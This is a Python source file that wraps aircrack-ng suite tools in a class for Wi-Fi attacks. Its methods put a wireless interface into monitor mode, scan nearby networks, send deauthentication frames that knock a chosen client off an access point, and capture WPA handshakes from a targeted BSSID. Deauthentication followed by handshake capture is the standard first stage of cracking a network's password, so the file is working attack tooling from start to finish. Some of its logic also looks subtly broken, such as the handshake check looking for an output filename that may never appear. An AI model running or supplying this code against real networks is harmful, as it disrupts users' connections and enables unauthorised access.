import subprocess, time, json, os, asyncio


class aircrackWrapper:
    def __init__(self):
        pass
    
    async def deauth(self, interface: str, ap: str, st: str, count: int):
        try:
            # Define the aireplay-ng command
            deauth_command = [
                "sudo", "aireplay-ng", "--deauth", str(count), 
                "-a", ap, "-c", st, "--ignore-negative-one",
                "--ignore-ts-check", "-D", "-e", "", interface
            ]

            # Run the deauthentication attack
            subprocess.run(deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            return {"status": "success", "message": f"Deauthentication attack sent to {st} connected to {ap}"}

        except subprocess.CalledProcessError as e:
            return {"status": "error", "message": "Error running aireplay-ng", "error": str(e)}
        except Exception as e:
            return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}

        
    def dump(self, interface: str, scan_duration: int = 5):
        try:
            # Define the airodump-ng command
            airodump_command = ["sudo", "airodump-ng", "--output-format", "json", "--write", "output", interface]

            # Start airodump-ng in the background
            airodump_process = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Wait for the specified scan_duration
            time.sleep(scan_duration)

            # Terminate airodump-ng
            airodump_process.terminate()

            # Read the captured JSON data from the file
            with open("output-01.json", "r") as json_file:
                data = json.load(json_file)

            # Extract and format the relevant information
            parsed_data = {}
            for entry in data:
                ssid = entry["SSID"]
                channel = entry["channel"]
                bssid = entry["BSSID"]
                parsed_data[ssid] = {
                    "channel": channel,
                    "ssid": ssid,
                    "bssid": bssid
                }

            return {"status": "success", "message": "Data parsed and formatted", "networks": parsed_data}

        except subprocess.CalledProcessError as e:
            return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
        except Exception as e:
            return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}


    async def captureHandshake(self, interface: str, bssid: str, channel: int, timeout: int = 15):
        try:
            # Define the airodump-ng command to target a specific network and capture a handshake
            output_filename = f"{bssid}.cap"  # Define the output filename
            airodump_command = [
                "sudo", "airodump-ng", "--output-format", "cap", "--bssid", bssid, "--channel", str(channel), "--write", output_filename, interface
            ]

            # Start airodump-ng to capture the handshake
            airodump_process = await asyncio.create_subprocess_exec(*airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Keep track of the start time
            start_time = time.time()

            while True:
                # Check if the handshake file exists
                if os.path.exists(output_filename):
                    # Handshake captured
                    airodump_process.terminate()
                    return {"status": "success", "message": f"Handshake captured and saved as {output_filename}"}

                # Check if the timeout has been reached
                elapsed_time = time.time() - start_time
                if elapsed_time >= timeout:
                    # Timeout reached, terminate airodump-ng
                    airodump_process.terminate()
                    return {"status": "error", "message": "Handshake not captured within the timeout"}

                # Wait for a short interval before checking again
                await asyncio.sleep(1)

        except subprocess.CalledProcessError as e:
            return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
        except Exception as e:
            return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}

    
    # Every time you call, it will update the interface mode (monitor / managed)
    def configInterface(self, interface: str, mode: str):
        try:
            if mode.lower() == "managed":
                commands = [
                    ["sudo", "ifconfig", interface, "down"],
                    ["sudo", "iwconfig", interface, "mode", "managed"],
                    ["sudo", "ifconfig", interface, "up"],
                ]
            elif mode.lower() == "monitor":
                commands = [
                    ["sudo", "ifconfig", interface, "down"],
                    ["sudo", "iwconfig", interface, "mode", "monitor"],
                    ["sudo", "ifconfig", interface, "up"],
                ]
            else:
                return {"status": "error", "message": "Invalid mode"}

            for cmd in commands:
                subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            return {"status": "success", "message": f"Interface changed to {mode} mode"}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "message": f"Error changing interface to {mode} mode", "error": str(e)}
        except Exception as e:
            return {"status": "error", "message": f"An unexpected error occurred", "error": str(e)}









